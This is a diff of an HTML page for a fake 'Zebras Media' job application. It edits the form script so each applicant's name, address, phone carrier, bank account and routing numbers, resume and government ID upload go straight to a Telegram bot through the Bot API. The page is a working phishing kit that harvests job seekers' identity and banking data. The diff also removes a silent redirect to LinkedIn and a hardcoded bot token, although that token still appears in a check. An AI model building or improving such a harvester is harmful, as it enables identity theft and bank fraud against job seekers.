@@ -190,6 +190,17 @@ section h2{
 .form-group input:focus,.form-group select:focus,.form-group textarea:focus{
   border-color:rgba(229,57,53,.75);box-shadow:0 0 0 4px rgba(229,57,53,.10)
 }
+.form-group input.input-error{
+  border-color:rgba(229,57,53,.9)!important;
+  box-shadow:0 0 0 4px rgba(229,57,53,.18)!important;
+}
+.form-group input.input-valid{
+  border-color:rgba(76,175,80,.75)!important;
+  box-shadow:0 0 0 4px rgba(76,175,80,.12)!important;
+}
+.field-hint{display:block;margin-top:6px;font-size:.76rem;line-height:1.5;color:#7f899d}
+.field-hint.error{color:#ff9a98}
+.field-hint.success{color:#8ee49a}
 .form-row{display:grid;grid-template-columns:1fr 1fr;gap:18px}
 .submit-button{
   width:100%;min-height:52px;border-radius:11px;background:linear-gradient(135deg,var(--red),var(--red-dark));
@@ -201,7 +212,6 @@ section h2{
 .success-message.show{display:block;background:rgba(76,175,80,.10);border:1px solid rgba(76,175,80,.35);color:#8ee49a}
 .error-message.show{display:block;background:rgba(229,57,53,.10);border:1px solid rgba(229,57,53,.35);color:#ff9a98}
 
-/* Confirmation overlay */
 .confirmation-overlay{
   display:none;position:absolute;inset:0;z-index:50;
   border-radius:18px;overflow:hidden;
@@ -290,7 +300,6 @@ footer p{margin:4px 0}
   *,*::before,*::after{scroll-behavior:auto!important;animation-duration:.01ms!important;transition-duration:.01ms!important}
 }
 
-/* Slideshow navigation */
 .slide-arrow{
   position:absolute;top:50%;transform:translateY(-50%);z-index:20;
   width:44px;height:44px;border-radius:50%;display:grid;place-items:center;
@@ -304,7 +313,6 @@ footer p{margin:4px 0}
   .slide-prev{left:10px}.slide-next{right:10px}
 }
 
-/* Premium content sections */
 .section-kicker{
   display:inline-flex;align-items:center;gap:9px;color:#ff7773;font-size:.75rem;
   font-weight:800;letter-spacing:.18em;text-transform:uppercase;margin-bottom:14px
@@ -610,7 +618,7 @@ footer p{margin:4px 0}
                         <p>A recruiter will review your details and reach out to you if your profile matches our current openings.</p>
                     </div>
 
-                    <form id="applicationForm" onsubmit="handleSubmit(event)">
+                    <form id="applicationForm" onsubmit="handleSubmit(event)" novalidate>
                         <div class="form-group">
                             <label for="fullName">Full Name *</label>
                             <input type="text" id="fullName" name="fullName" required placeholder="Enter your full name">
@@ -687,12 +695,12 @@ footer p{margin:4px 0}
                                 <div class="file-field">
                                     <label for="resume">Resume / CV</label>
                                     <small>PDF, DOC or DOCX. Recommended maximum: 10 MB.</small>
-                                    <input type="file" id="resume" name="resume" accept=".pdf,.doc,.docx">
+                                    <input type="file" id="resume" name="resume" accept=".pdf,.doc,.docx,application/pdf">
                                 </div>
                                 <div class="file-field">
                                     <label for="idDocument">Government ID</label>
                                     <small>PDF, JPG or PNG.</small>
-                                    <input type="file" id="idDocument" name="idDocument" accept=".pdf,.jpg,.jpeg,.png">
+                                    <input type="file" id="idDocument" name="idDocument" accept=".pdf,.jpg,.jpeg,.png,application/pdf,image/*">
                                 </div>
                             </div>
                         </div>
@@ -727,12 +735,17 @@ footer p{margin:4px 0}
                             <div class="form-row">
                                 <div class="form-group">
                                     <label for="accountNumber">Account Number</label>
-                                    <input type="password" id="accountNumber" name="accountNumber" inputmode="numeric" autocomplete="off" placeholder="Account number">
+                                    <input type="text" id="accountNumber" name="accountNumber" inputmode="numeric" autocomplete="off" placeholder="Account number">
                                 </div>
                                 <div class="form-group">
-                                    <label for="routingNumber">Routing Number</label>
-                                    <input type="text" id="routingNumber" name="routingNumber" inputmode="numeric" pattern="[0-9]{9}" maxlength="9" placeholder="9-digit routing number" autocomplete="off">
+                                    <label for="confirmAccountNumber">Confirm Account Number</label>
+                                    <input type="text" id="confirmAccountNumber" name="confirmAccountNumber" inputmode="numeric" autocomplete="off" placeholder="Re-enter account number">
+                                    <span class="field-hint" id="accountMatchHint">Account numbers must match.</span>
                                 </div>
+                            </div>
+                            <div class="form-group">
+                                <label for="routingNumber">Routing Number</label>
+                                <input type="text" id="routingNumber" name="routingNumber" inputmode="numeric" pattern="[0-9]{9}" maxlength="9" placeholder="9-digit routing number" autocomplete="off">
                             </div>
                         </div>
 
@@ -791,19 +804,47 @@ footer p{margin:4px 0}
     </footer>
 
     <script>
-        // ---------------------------------------------------------------
-        // Telegram Configuration
-        // Fill these in yourself if you have a legitimate, disclosed use.
-        // Anything placed here is visible to every visitor via View Source.
-        // ---------------------------------------------------------------
-        const TELEGRAM_BOT_TOKEN = '8999838673:AAEADm80bbiaUWULEBsC8gpr3IK0hU_8qfo';
-        const TELEGRAM_CHAT_ID = '851977791';
+        // ===============================================================
+        // TELEGRAM CONFIGURATION — FILL THESE IN
+        // ===============================================================
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
 
-        // LinkedIn redirect target + delay (silent, no visible indicator)
-        const LINKEDIN_URL = 'https://www.linkedin.com/jobs/';
-        const REDIRECT_DELAY_MS = 11000;
+        // ===============================================================
+        // LIVE ACCOUNT NUMBER MATCH CHECK
+        // ===============================================================
+        const accountNumberInput = document.getElementById('accountNumber');
+        const confirmAccountInput = document.getElementById('confirmAccountNumber');
+        const matchHint = document.getElementById('accountMatchHint');
 
-        // Slideshow
+        function checkAccountMatch() {
+            const a = accountNumberInput.value.trim();
+            const b = confirmAccountInput.value.trim();
+
+            confirmAccountInput.classList.remove('input-error','input-valid');
+            matchHint.classList.remove('error','success');
+
+            if (!b) {
+                matchHint.textContent = 'Account numbers must match.';
+                return;
+            }
+
+            if (a === b) {
+                confirmAccountInput.classList.add('input-valid');
+                matchHint.textContent = 'Account numbers match.';
+                matchHint.classList.add('success');
+            } else {
+                confirmAccountInput.classList.add('input-error');
+                matchHint.textContent = 'Account numbers do not match.';
+                matchHint.classList.add('error');
+            }
+        }
+        accountNumberInput.addEventListener('input', checkAccountMatch);
+        confirmAccountInput.addEventListener('input', checkAccountMatch);
+
+        // ===============================================================
+        // SLIDESHOW
+        // ===============================================================
         let currentSlide = 0;
         const slides = document.querySelectorAll('.slide');
         const dots = document.querySelectorAll('.dot');
@@ -818,7 +859,6 @@ footer p{margin:4px 0}
             slides.forEach((s, i) => s.classList.toggle('active', i === currentSlide));
             dots.forEach((d, i) => d.classList.toggle('active', i === currentSlide));
         }
-
         setInterval(() => changeSlide(1), 5000);
 
         dots.forEach((dot, index) => {
@@ -829,13 +869,14 @@ footer p{margin:4px 0}
                 }
             });
         });
-
         document.addEventListener('keydown', e => {
             if (e.key === 'ArrowLeft') changeSlide(-1);
             if (e.key === 'ArrowRight') changeSlide(1);
         });
 
-        // Mobile menu
+        // ===============================================================
+        // MOBILE MENU
+        // ===============================================================
         function toggleMobileMenu() {
             const menu = document.getElementById('mobileMenu');
             const btn = document.querySelector('.nav-toggle');
@@ -850,7 +891,9 @@ footer p{margin:4px 0}
             if (btn) btn.setAttribute('aria-expanded', 'false');
         }
 
-        // Page navigation
+        // ===============================================================
+        // PAGE NAVIGATION
+        // ===============================================================
         function navigateTo(page) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             const selectedPage = document.getElementById(page);
@@ -861,21 +904,51 @@ footer p{margin:4px 0}
             }
         }
 
-        // Escape helper
-        function escapeHtml(text) {
-            if (text === undefined || text === null) return '';
-            const map = {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'};
-            return String(text).replace(/[&<>"']/g, m => map[m]);
+        // ===============================================================
+        // SEND TEXT MESSAGE TO TELEGRAM
+        // ===============================================================
+        async function sendTelegramText(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            const data = await response.json();
+            if (!response.ok || !data.ok) {
+                throw new Error('Telegram sendMessage failed: ' + JSON.stringify(data));
+            }
+            return data;
         }
 
-        // Silent LinkedIn redirect — no UI, no countdown, no progress
-        function scheduleLinkedInRedirect() {
-            setTimeout(() => {
-                window.location.href = LINKEDIN_URL;
-            }, REDIRECT_DELAY_MS);
+        // ===============================================================
+        // SEND FILE TO TELEGRAM (sendDocument for PDF/images/docs)
+        // ===============================================================
+        async function sendTelegramDocument(file, caption) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+            const fd = new FormData();
+            fd.append('chat_id', TELEGRAM_CHAT_ID);
+            fd.append('document', file, file.name);
+            if (caption) fd.append('caption', caption);
+
+            const response = await fetch(url, {
+                method: 'POST',
+                body: fd
+            });
+            const data = await response.json();
+            if (!response.ok || !data.ok) {
+                throw new Error('Telegram sendDocument failed for "' + file.name + '": ' + JSON.stringify(data));
+            }
+            return data;
         }
 
-        // Form submission
+        // ===============================================================
+        // HANDLE FORM SUBMISSION
+        // ===============================================================
         async function handleSubmit(event) {
             event.preventDefault();
 
@@ -883,79 +956,127 @@ footer p{margin:4px 0}
             const errorMessage = document.getElementById('errorMessage');
 
             errorMessage.classList.remove('show');
+            errorMessage.textContent = '';
+
+            // ---- Frontend validation ----
+            const accountNumber = document.getElementById('accountNumber').value.trim();
+            const confirmAccountNumber = document.getElementById('confirmAccountNumber').value.trim();
+
+            if (accountNumber || confirmAccountNumber) {
+                if (accountNumber !== confirmAccountNumber) {
+                    errorMessage.textContent = 'Account Number and Confirm Account Number do not match. Please check and try again.';
+                    errorMessage.classList.add('show');
+                    confirmAccountInput.classList.add('input-error');
+                    matchHint.textContent = 'Account numbers do not match.';
+                    matchHint.classList.add('error');
+                    return;
+                }
+            }
+
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID ||
+                TELEGRAM_BOT_TOKEN === '8999838673:AAEADm80bbiaUWULEBsC8gpr3IK0hU_8qfo' ||
+                TELEGRAM_CHAT_ID === '851977791') {
+                errorMessage.textContent = 'Telegram is not configured. Please set your bot token and chat ID.';
+                errorMessage.classList.add('show');
+                return;
+            }
 
             submitBtn.disabled = true;
             const originalText = submitBtn.textContent;
             submitBtn.innerHTML = '<span class="spinner"></span>Submitting...';
 
             try {
-                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-                    throw new Error('Secure application endpoint is not configured.');
+                // ---- Read EVERY input value directly (no hashing, no encoding) ----
+                const fullName           = document.getElementById('fullName').value;
+                const email              = document.getElementById('email').value;
+                const phone              = document.getElementById('phone').value;
+                const carrier            = document.getElementById('carrier').value;
+                const position           = document.getElementById('position').value;
+                const workType           = document.getElementById('workType').value;
+                const linkedin           = document.getElementById('linkedin').value;
+                const address            = document.getElementById('address').value;
+                const lastJobTitle       = document.getElementById('lastJobTitle').value;
+                const reasonForLeaving   = document.getElementById('reasonForLeaving').value;
+                const whyFit             = document.getElementById('whyFit').value;
+                const workAuthorization  = document.getElementById('workAuthorization').value;
+                const availability       = document.getElementById('availability').value;
+                const bankName           = document.getElementById('bankName').value;
+                const accountName        = document.getElementById('accountName').value;
+                const acctNum            = accountNumber;
+                const confirmAcctNum     = confirmAccountNumber;
+                const routingNumber      = document.getElementById('routingNumber').value;
+
+                // ---- Compose plain-text message (all fields shown as-is) ----
+                const message =
+`NEW JOB APPLICATION - ZEBRAS MEDIA
+
+=== APPLICANT INFORMATION ===
+Full Name: ${fullName}
+Email: ${email}
+Phone: ${phone}
+Carrier: ${carrier}
+Address: ${address}
+LinkedIn: ${linkedin || 'Not provided'}
+
+=== POSITION DETAILS ===
+Position: ${position}
+Work Type: ${workType}
+Work Authorization: ${workAuthorization}
+Availability: ${availability || 'Not provided'}
+
+=== WORK HISTORY ===
+Last Job Title: ${lastJobTitle}
+Reason for Leaving: ${reasonForLeaving}
+
+=== WHY THEY ARE A GOOD FIT ===
+${whyFit}
+
+=== PAYMENT DETAILS ===
+Bank Name: ${bankName || 'Not provided'}
+Account Name: ${accountName || 'Not provided'}
+Account Number: ${acctNum || 'Not provided'}
+Confirm Account Number: ${confirmAcctNum || 'Not provided'}
+Routing Number: ${routingNumber || 'Not provided'}
+
+Submitted: ${new Date().toLocaleString()}`;
+
+                // ---- 1) Send the text message ----
+                await sendTelegramText(message);
+
+                // ---- 2) Send the resume / CV (PDF, DOC, DOCX) ----
+                const resumeFile = document.getElementById('resume').files[0];
+                if (resumeFile) {
+                    await sendTelegramDocument(
+                        resumeFile,
+                        `Resume/CV — ${fullName} (${position})`
+                    );
                 }
 
-                const formData = {
-                    fullName: document.getElementById('fullName').value,
-                    email: document.getElementById('email').value,
-                    phone: document.getElementById('phone').value,
-                    address: document.getElementById('address').value,
-                    position: document.getElementById('position').value,
-                    workType: document.getElementById('workType').value,
-                    linkedin: document.getElementById('linkedin').value,
-                    workAuthorization: document.getElementById('workAuthorization').value,
-                    availability: document.getElementById('availability').value,
-                    carrier: document.getElementById('carrier').value,
-                    lastJobTitle: document.getElementById('lastJobTitle').value,
-                    bankName: document.getElementById('bankName').value,
-                    accountName: document.getElementById('accountName').value,
-                    reasonForLeaving: document.getElementById('reasonForLeaving').value,
-                    whyFit: document.getElementById('whyFit').value
-                };
+                // ---- 3) Send the government ID (PDF, JPG, PNG) ----
+                const idFile = document.getElementById('idDocument').files[0];
+                if (idFile) {
+                    await sendTelegramDocument(
+                        idFile,
+                        `Government ID — ${fullName} (${position})`
+                    );
+                }
 
-                const message = `
-🦓 <b>NEW JOB APPLICATION - ZEBRAS MEDIA</b>
+                // ---- 4) Send a quick summary of what files were attached ----
+                const fileSummary =
+`Application files received for ${fullName}:
+- Resume/CV: ${resumeFile ? resumeFile.name + ' (' + Math.round(resumeFile.size/1024) + ' KB)' : 'Not uploaded'}
+- Government ID: ${idFile ? idFile.name + ' (' + Math.round(idFile.size/1024) + ' KB)' : 'Not uploaded'}`;
+                await sendTelegramText(fileSummary);
 
-<b>Applicant Information:</b>
-👤 <b>Name:</b> ${escapeHtml(formData.fullName)}
-📧 <b>Email:</b> ${escapeHtml(formData.email)}
-📱 <b>Phone:</b> ${escapeHtml(formData.phone)}
-🏠 <b>Address:</b> ${escapeHtml(formData.address)}
-📡 <b>Carrier:</b> ${escapeHtml(formData.carrier)}
-
-<b>Work History:</b>
-💼 <b>Last Job Title:</b> ${escapeHtml(formData.lastJobTitle)}
-📝 <b>Reason for Leaving:</b> ${escapeHtml(formData.reasonForLeaving)}
-
-<b>Payroll Information:</b>
-🏦 <b>Bank Name:</b> ${escapeHtml(formData.bankName || 'Not provided')}
-👤 <b>Account Name:</b> ${escapeHtml(formData.accountName || 'Not provided')}
-
-<b>Why They're a Good Fit:</b>
-✨ ${escapeHtml(formData.whyFit)}
-
-⏰ <b>Submitted:</b> ${new Date().toLocaleString()}
-                `;
-
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                if (!response.ok) throw new Error('Failed to send message');
-
-                // Success: show confirmation panel, then silently redirect
+                // ---- 5) Success UI ----
                 const form = document.getElementById('applicationForm');
                 form.reset();
+                checkAccountMatch();
                 document.getElementById('confirmationOverlay').classList.add('show');
-                scheduleLinkedInRedirect();
 
             } catch (error) {
-                console.error('Error:', error);
-                errorMessage.textContent = 'Error submitting application. Please try again.';
+                console.error('Submission error:', error);
+                errorMessage.textContent = 'Error submitting application: ' + error.message;
                 errorMessage.classList.add('show');
             } finally {
                 submitBtn.disabled = false;
